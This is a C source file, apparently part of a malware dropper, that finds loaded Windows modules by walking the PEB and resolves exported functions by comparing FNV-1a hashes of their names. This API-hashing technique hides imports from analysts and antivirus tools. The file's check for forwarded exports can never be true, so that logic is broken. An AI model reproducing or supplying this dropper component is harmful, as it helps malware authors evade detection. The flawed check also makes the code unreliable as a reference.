#include <ldr.h>
#include <crypto\fnv1a.h>

HMODULE
LdrGetModule(
    IN DWORD dwModuleNameHash
    )
{
    PPEB Peb = RtlpGetPeb();

    PLDR_DATA_TABLE_ENTRY Index = (PVOID)((PPEB_LDR_DATA)Peb->Ldr)->InLoadOrderModuleList.Flink;
    PLDR_DATA_TABLE_ENTRY End   = Index;

    do {
        if (Index->BaseDllName.Length) {
            if (Fnv1AHashStringW(Index->BaseDllName.Buffer) == dwModuleNameHash) {
                return (HMODULE)Index->DllBase;
            }
        }

        Index = (PVOID)Index->InLoadOrderLinks.Flink;
    } while (Index != End);

    return NULL;
}

ULONG
LdrGetProcAddressEx(
    IN HMODULE hModule,
    IN ULONG   dwProcCount,
    IN PDWORD  dwNameSumsList,
    IN PVOID   pProcList
    )
{
    PIMAGE_OPTIONAL_HEADER  OptionalHeader  = (PIMAGE_OPTIONAL_HEADER )((ULONG_PTR)hModule + ((PIMAGE_DOS_HEADER)hModule)->e_lfanew + sizeof(ULONG) + IMAGE_SIZEOF_FILE_HEADER);
    PIMAGE_DATA_DIRECTORY   DataDirectory   = (PIMAGE_DATA_DIRECTORY  )(&OptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
    PIMAGE_EXPORT_DIRECTORY ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)hModule + DataDirectory->VirtualAddress);

    ULONG     dwProcFound  = 0;
    ULONG_PTR dwExportBase = (ULONG_PTR)ExportDirectory;
    ULONG_PTR dwExportEnd  = (ULONG_PTR)ExportDirectory + DataDirectory->Size;
    PULONG    dwFunctions  = (PULONG )((ULONG_PTR)hModule + ExportDirectory->AddressOfFunctions);
    PULONG    dwNames      = (PULONG )((ULONG_PTR)hModule + ExportDirectory->AddressOfNames);
    PUSHORT   nOrdinals    = (PUSHORT)((ULONG_PTR)hModule + ExportDirectory->AddressOfNameOrdinals);

    for (ULONG i = 0; i != ExportDirectory->NumberOfNames && dwProcFound != dwProcCount; i++) {
        ULONG_PTR dwFunctionAddress = (ULONG_PTR)hModule + dwFunctions[nOrdinals[i]];

        if (dwFunctionAddress < dwExportBase && dwFunctionAddress > dwExportEnd) {
            continue;
        }

        DWORD dwFunctionSum = Fnv1AHashStringA((PSTR)((ULONG_PTR)hModule + dwNames[i]));

        for (ULONG y = 0; y != dwProcCount; y++) {
            if (dwFunctionSum == dwNameSumsList[y]) {
                #if SCFG_DROPPER_LDR_PRINT_FOUND_PROC == ON
                    $DLOG0(DLG_FLT_SUCCESS, "%p %08lX %s", dwFunctionAddress, dwFunctionSum, (PSTR)((ULONG_PTR)hModule + dwNames[i]));
                #endif

                ((PULONG_PTR)pProcList)[y] = dwFunctionAddress;
                dwProcFound++;
        
                break;
            }
        }
    }

    return dwProcFound;
}

#if 0
    PVOID
    LdrGetProcAddress(
        IN HMODULE hModule,
        IN DWORD   dwProcNameHash
        )
    {
        PIMAGE_OPTIONAL_HEADER  OptionalHeader  = (PIMAGE_OPTIONAL_HEADER )((ULONG_PTR)hModule + ((PIMAGE_DOS_HEADER)hModule)->e_lfanew + sizeof(ULONG) + IMAGE_SIZEOF_FILE_HEADER);    PIMAGE_DATA_DIRECTORY   DataDirectory   = (PIMAGE_DATA_DIRECTORY  )(&OptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
        PIMAGE_EXPORT_DIRECTORY ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)hModule + DataDirectory->VirtualAddress);

        ULONG_PTR dwExportBase = (ULONG_PTR)ExportDirectory;
        ULONG_PTR dwExportEnd  = (ULONG_PTR)ExportDirectory + DataDirectory->Size;
        PULONG    dwFunctions  = (PULONG )((ULONG_PTR)hModule + ExportDirectory->AddressOfFunctions);
        PULONG    dwNames      = (PULONG )((ULONG_PTR)hModule + ExportDirectory->AddressOfNames);
        PUSHORT   nOrdinals    = (PUSHORT)((ULONG_PTR)hModule + ExportDirectory->AddressOfNameOrdinals);

        for (ULONG i = 0; i != ExportDirectory->NumberOfNames; i++) {
            ULONG_PTR dwFunctionAddress = (ULONG_PTR)hModule + dwFunctions[nOrdinals[i]];

            if (dwFunctionAddress < dwExportBase && dwFunctionAddress > dwExportEnd) {
                continue;
            }

            DWORD dwFunctionSum = Fnv1AHashStringA((PSTR)((ULONG_PTR)hModule + dwNames[i]));

            if (dwFunctionSum == dwProcNameHash) {
                 return (PVOID)((ULONG_PTR)dwFunctionAddress);
            }
        }

        return NULL;
    }
#endif
